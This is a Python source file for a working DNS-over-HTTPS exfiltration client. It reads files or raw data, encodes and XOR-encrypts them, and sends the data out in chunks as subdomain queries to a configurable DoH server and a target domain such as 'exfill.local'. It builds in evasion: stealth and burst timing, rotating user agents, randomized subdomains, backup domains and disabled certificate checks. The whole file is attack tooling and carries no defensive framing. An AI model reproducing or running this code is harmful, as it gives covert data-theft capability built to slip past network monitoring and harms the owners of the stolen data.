#!/usr/bin/env python3
import base64
import requests
import time
import random
import string
import hashlib
import json
import os
from typing import List, Dict, Any, Optional
from dataclasses import dataclass
from enum import Enum

class EncodingType(Enum):
    BASE64 = "base64"
    HEX = "hex"
    BASE32 = "base32"
    CUSTOM = "custom"

class TimingPattern(Enum):
    REGULAR = "regular"
    RANDOM = "random"
    BURST = "burst"
    STEALTH = "stealth"

@dataclass
class ExfiltrationConfig:
    doh_server: str = "https://doh.local/dns-query"
    target_domain: str = "exfill.local"
    chunk_size: int = 30
    
    encoding: EncodingType = EncodingType.BASE64
    compression: bool = False
    encryption: bool = False
    encryption_key: Optional[str] = None
    
    timing_pattern: TimingPattern = TimingPattern.REGULAR
    base_delay: float = 0.2
    delay_variance: float = 0.1
    burst_size: int = 5
    burst_delay: float = 2.0
    
    domain_rotation: bool = False
    backup_domains: List[str] = None
    subdomain_randomization: bool = True
    padding: bool = False
    padding_size: int = 10
    
    max_retries: int = 3
    retry_delay: float = 1.0
    timeout: float = 5.0
    
    def __post_init__(self):
        if self.backup_domains is None:
            self.backup_domains = []

class DoHExfiltrationClient:
    """DoH exfiltration client with configurable parameters"""
    
    def __init__(self, config: ExfiltrationConfig):
        self.config = config
        self.session = requests.Session()
        # Disable SSL verification for self-signed certificates
        self.session.verify = False
        import urllib3
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
        self.current_domain_index = 0
        self.stats = {
            'total_chunks': 0,
            'successful_chunks': 0,
            'failed_chunks': 0,
            'retries': 0,
            'total_bytes': 0,
            'start_time': None,
            'end_time': None
        }
        
    def exfiltrate_file(self, file_path: str, session_id: Optional[str] = None) -> bool:
        try:
            print(f"Starting DoH exfiltration: {file_path}")
            print(f"Configuration: {self._config_summary()}")
            
            if not self._wait_for_doh_connectivity():
                print("DoH server not reachable, aborting exfiltration")
                return False
            
            self.stats['start_time'] = time.time()
            
            if not session_id:
                session_id = self._generate_session_id()
            
            data = self._read_file(file_path)
            if not data:
                return False
            
            prepared_data = self._prepare_data(data)
            
            chunks = self._split_into_chunks(prepared_data)
            self.stats['total_chunks'] = len(chunks)
            self.stats['total_bytes'] = len(data)
            
            print(f"File size: {len(data)} bytes")
            print(f"Prepared data size: {len(prepared_data)} bytes")
            print(f"Total chunks: {len(chunks)}")
            
            success = self._send_chunks(chunks, session_id)
            
            self.stats['end_time'] = time.time()
            self._print_final_stats()
            
            return success
            
        except Exception as e:
            print(f"Exfiltration failed: {e}")
            return False
    
    def exfiltrate_data(self, data: bytes, data_name: str = "data", session_id: Optional[str] = None) -> bool:
        try:
            print(f"Starting DoH data exfiltration: {data_name}")
            print(f"Configuration: {self._config_summary()}")
            
            if not self._wait_for_doh_connectivity():
                print("DoH server not reachable, aborting exfiltration")
                return False
            
            self.stats['start_time'] = time.time()
            
            if not session_id:
                session_id = self._generate_session_id()
            
            prepared_data = self._prepare_data(data)
            chunks = self._split_into_chunks(prepared_data)
            
            self.stats['total_chunks'] = len(chunks)
            self.stats['total_bytes'] = len(data)
            
            print(f"Data size: {len(data)} bytes")
            print(f"Prepared data size: {len(prepared_data)} bytes")
            print(f"Total chunks: {len(chunks)}")
            
            success = self._send_chunks(chunks, session_id)
            
            self.stats['end_time'] = time.time()
            self._print_final_stats()
            
            return success
            
        except Exception as e:
            print(f"Data exfiltration failed: {e}")
            return False
    
    def _read_file(self, file_path: str) -> Optional[bytes]:
        try:
            with open(file_path, 'rb') as f:
                return f.read()
        except Exception as e:
            print(f"Failed to read file {file_path}: {e}")
            return None
    
    def _wait_for_doh_connectivity(self, max_attempts: int = 10, delay: float = 2.0) -> bool:
        print(f"Checking DoH server connectivity...")
        print(f"Testing server: {self.config.doh_server}")
        
        test_domains = ["google.com", "cloudflare.com", "example.com"]
        
        for attempt in range(max_attempts):
            print(f"Attempt {attempt + 1}/{max_attempts}...")
            
            for test_domain in test_domains:
                try:
                    params = {
                        "name": test_domain,
                        "type": "A"
                    }
                    headers = {
                        "accept": "application/dns-json",
                        "user-agent": "DoH-Connectivity-Test/1.0"
                    }
                    
                    response = self.session.get(
                        self.config.doh_server,
                        params=params,
                        headers=headers,
                        timeout=self.config.timeout
                    )
                    
                    if response.status_code == 200:
                        try:
                            dns_response = response.json()
                            if "Answer" in dns_response or "Authority" in dns_response:
                                print(f"DoH server connectivity verified with {test_domain}")
                                print(f"Server ready for exfiltration!")
                                return True
                        except:
                            print(f"DoH server responding (HTTP 200) for {test_domain}")
                            return True
                    else:
                        print(f"HTTP {response.status_code} for {test_domain}")
                        
                except requests.exceptions.ConnectionError:
                    print(f"Connection refused for {test_domain}")
                except requests.exceptions.Timeout:
                    print(f"Timeout for {test_domain}")
                except Exception as e:
                    print(f"Error testing {test_domain}: {e}")
            
            if attempt < max_attempts - 1:
                print(f"💤 Waiting {delay}s before next attempt...")
                time.sleep(delay)
        
        print(f"DoH server not reachable after {max_attempts} attempts")
        print(f"Please check:")
        print(f"   - DoH server is running: {self.config.doh_server}")
        print(f"   - Network connectivity")
        print(f"   - Firewall settings")
        print(f"   - SSL certificate configuration")
        
        return False
    
    def _calculate_optimal_chunk_size(self, data_size: int) -> int:
        MAX_SUBDOMAIN_LENGTH = 50
        MIN_CHUNK_SIZE = 8
        MAX_CHUNK_SIZE = 40
        
        HEADER_SIZE = 20
        AVAILABLE_SPACE = MAX_SUBDOMAIN_LENGTH - HEADER_SIZE
        
        if data_size < 1024:  # < 1KB - Small files
            chunk_size = min(MAX_CHUNK_SIZE, max(MIN_CHUNK_SIZE, data_size // 10))
            strategy = "small file"
        elif data_size < 10240:  # < 10KB - Medium files
            chunk_size = min(MAX_CHUNK_SIZE, max(MIN_CHUNK_SIZE, data_size // 50))
            strategy = "medium file"
        elif data_size < 102400:  # < 100KB - Large files
            chunk_size = min(MAX_CHUNK_SIZE, max(MIN_CHUNK_SIZE, data_size // 200))
            strategy = "large file"
        else:  # > 100KB - Very large files
            chunk_size = MAX_CHUNK_SIZE
            strategy = "very large file"
        
        chunk_size = min(chunk_size, AVAILABLE_SPACE)
        
        estimated_encoded_size = data_size * 1.4  # Approximate Base64 overhead
        estimated_chunks = int(estimated_encoded_size / chunk_size) + 1
        
        print(f"Chunk size calculation:")
        print(f"   File size: {data_size:,} bytes")
        print(f"   Strategy: {strategy}")
        print(f"   Optimal chunk size: {chunk_size} chars")
        print(f"   Estimated chunks: {estimated_chunks:,}")
        print(f"   Estimated time: {estimated_chunks * self.config.base_delay:.1f}s")
        
        return chunk_size

    def _prepare_data(self, data: bytes) -> str:
        prepared = data
        
        optimal_chunk_size = self._calculate_optimal_chunk_size(len(data))
        
        original_chunk_size = self.config.chunk_size
        self.config.chunk_size = optimal_chunk_size
        
        print(f"Chunk size: {original_chunk_size} → {optimal_chunk_size} (auto-adjusted)")
        
        if self.config.compression:
            import gzip
            prepared = gzip.compress(prepared)
            print(f"🗜️  Compressed: {len(data)} -> {len(prepared)} bytes")
            
            # Recalculate optimal size after compression
            new_optimal = self._calculate_optimal_chunk_size(len(prepared))
            if new_optimal != optimal_chunk_size:
                self.config.chunk_size = new_optimal
                print(f"Post-compression adjustment: {optimal_chunk_size} → {new_optimal}")
        
        if self.config.encryption and self.config.encryption_key:
            prepared = self._encrypt_data(prepared)
            print(f"Encrypted data")
        
        if self.config.encoding == EncodingType.BASE64:
            encoded = base64.urlsafe_b64encode(prepared).decode('ascii')
        elif self.config.encoding == EncodingType.HEX:
            encoded = prepared.hex()
        elif self.config.encoding == EncodingType.BASE32:
            encoded = base64.b32encode(prepared).decode('ascii')
        elif self.config.encoding == EncodingType.CUSTOM:
            encoded = self._custom_encode(prepared)
        else:
            encoded = base64.urlsafe_b64encode(prepared).decode('ascii')
        
        print(f"Encoded with {self.config.encoding.value}: {len(encoded)} chars")
        return encoded
    
    def _encrypt_data(self, data: bytes) -> bytes:
        # Simple XOR for demo
        key = self.config.encryption_key.encode()[:32].ljust(32, b'\x00')
        encrypted = bytearray()
        for i, byte in enumerate(data):
            encrypted.append(byte ^ key[i % len(key)])
        return bytes(encrypted)
    
    def _custom_encode(self, data: bytes) -> str:
        encoded = base64.urlsafe_b64encode(data).decode('ascii')
        custom_map = str.maketrans('+=/', 'xyz')
        return encoded.translate(custom_map)
    
    def _split_into_chunks(self, data: str) -> List[str]:
        chunks = []
        chunk_size = self.config.chunk_size
        
        for i in range(0, len(data), chunk_size):
            chunk = data[i:i + chunk_size]
            
            if self.config.padding and len(chunk) < chunk_size:
                padding_chars = ''.join(random.choices(string.ascii_lowercase, k=self.config.padding_size))
                chunk += padding_chars[:chunk_size - len(chunk)]
            
            chunks.append(chunk)
        
        return chunks
    
    def _estimate_transmission_time(self, chunks: List[str]) -> float:
        base_time = len(chunks) * self.config.base_delay
        
        if self.config.timing_pattern == TimingPattern.RANDOM:
            # Ajouter la variance moyenne
            base_time += len(chunks) * (self.config.delay_variance / 2)
        elif self.config.timing_pattern == TimingPattern.BURST:
            # Calculer le temps avec les bursts
            num_bursts = len(chunks) // self.config.burst_size
            burst_time = num_bursts * self.config.burst_delay
            regular_time = (len(chunks) - num_bursts) * 0.01
            base_time = burst_time + regular_time
        elif self.config.timing_pattern == TimingPattern.STEALTH:
            base_time *= 3
        
        return base_time

    def _send_chunks(self, chunks: List[str], session_id: str) -> bool:
        print(f"\nStarting chunk transmission...")
        print(f"Session ID: {session_id}")
        
        estimated_time = self._estimate_transmission_time(chunks)
        print(f"Estimated transmission time: {estimated_time:.1f}s")
        
        total_chars = sum(len(chunk) for chunk in chunks)
        efficiency = (total_chars / len(chunks)) / self.config.chunk_size * 100 if self.config.chunk_size > 0 else 0
        print(f"Chunk utilization: {efficiency:.1f}%")
        
        all_success = True
        start_time = time.time()
        
        for i, chunk in enumerate(chunks):
            if i % max(1, len(chunks) // 10) == 0 or i % 100 == 0:
                elapsed = time.time() - start_time
                progress = (i / len(chunks)) * 100
                if i > 0:
                    eta = (elapsed / i) * (len(chunks) - i)
                    print(f"Progress: {progress:.1f}% ({i}/{len(chunks)}) - ETA: {eta:.1f}s")
            
            success = self._send_single_chunk(chunk, i, len(chunks), session_id)
            
            if success:
                self.stats['successful_chunks'] += 1
            else:
                self.stats['failed_chunks'] += 1
                all_success = False
            
            if i < len(chunks) - 1: 
                self._apply_timing_delay(i)
        
        success_rate = (self.stats['successful_chunks'] / self.stats['total_chunks']) * 100
        actual_time = time.time() - start_time
        print(f"\nTransmission complete: {success_rate:.1f}% success rate")
        print(f"Actual time: {actual_time:.1f}s (estimated: {estimated_time:.1f}s)")
        
        return all_success
    
    def _send_single_chunk(self, chunk: str, index: int, total: int, session_id: str) -> bool:
        for attempt in range(self.config.max_retries + 1):
            try:
                subdomain = self._build_subdomain(chunk, index, total, session_id)
                
                domain = self._get_current_domain()
                full_domain = f"{subdomain}.{domain}"
                
                params = {
                    "name": full_domain,
                    "type": "A"
                }
                headers = {
                    "accept": "application/dns-json",
                    "user-agent": self._get_random_user_agent()
                }
                
                response = self.session.get(
                    self.config.doh_server,
                    params=params,
                    headers=headers,
                    timeout=self.config.timeout
                )
                
                if response.status_code == 200:
                    print(f"[{index+1:3d}/{total}] Sent chunk: {subdomain[:50]}...")
                    return True
                else:
                    print(f"[{index+1:3d}/{total}] HTTP {response.status_code}: {subdomain[:30]}...")
                    
            except Exception as e:
                print(f"[{index+1:3d}/{total}] Attempt {attempt+1} failed: {e}")
                
                if attempt < self.config.max_retries:
                    time.sleep(self.config.retry_delay)
                    self.stats['retries'] += 1
        
        print(f"[{index+1:3d}/{total}] All attempts failed for chunk")
        return False
    
    def _build_subdomain(self, chunk: str, index: int, total: int, session_id: str) -> str:
        base = f"{session_id[:8]}-{index:04d}-{total:04d}-{chunk}"
        
        if self.config.subdomain_randomization:
            random_suffix = ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))
            base += f".{random_suffix}"
        
        return base
    
    def _get_current_domain(self) -> str:
        if not self.config.domain_rotation or not self.config.backup_domains:
            return self.config.target_domain
        
        all_domains = [self.config.target_domain] + self.config.backup_domains
        domain = all_domains[self.current_domain_index % len(all_domains)]
        self.current_domain_index += 1
        
        return domain
    
    def _get_random_user_agent(self) -> str:
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101"
        ]
        return random.choice(user_agents)
    
    def _apply_timing_delay(self, chunk_index: int):
        if self.config.timing_pattern == TimingPattern.REGULAR:
            time.sleep(self.config.base_delay)
            
        elif self.config.timing_pattern == TimingPattern.RANDOM:
            delay = self.config.base_delay + random.uniform(-self.config.delay_variance, self.config.delay_variance)
            delay = max(0.01, delay) 
            time.sleep(delay)
            
        elif self.config.timing_pattern == TimingPattern.BURST:
            if (chunk_index + 1) % self.config.burst_size == 0:
                time.sleep(self.config.burst_delay)
            else:
                time.sleep(0.01)
                
        elif self.config.timing_pattern == TimingPattern.STEALTH:
            delay = random.uniform(self.config.base_delay * 2, self.config.base_delay * 5)
            time.sleep(delay)
    
    def _generate_session_id(self) -> str:
        timestamp = str(int(time.time()))
        random_part = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
        return f"{timestamp}_{random_part}"
    
    def _config_summary(self) -> str:
        return (f"Server: {self.config.doh_server}, "
                f"Chunk: {self.config.chunk_size}, "
                f"Encoding: {self.config.encoding.value}, "
                f"Timing: {self.config.timing_pattern.value}")
    
    def _print_final_stats(self):
        duration = self.stats['end_time'] - self.stats['start_time']
        throughput = self.stats['total_bytes'] / duration if duration > 0 else 0
        
        print(f"\n📈 EXFILTRATION STATISTICS:")
        print(f"   Duration: {duration:.2f} seconds")
        print(f"   Total chunks: {self.stats['total_chunks']}")
        print(f"   Successful: {self.stats['successful_chunks']}")
        print(f"   Failed: {self.stats['failed_chunks']}")
        print(f"   Retries: {self.stats['retries']}")
        print(f"   Success rate: {(self.stats['successful_chunks']/self.stats['total_chunks']*100):.1f}%")
        print(f"   Throughput: {throughput:.2f} bytes/sec")
        print(f"   Total bytes: {self.stats['total_bytes']}")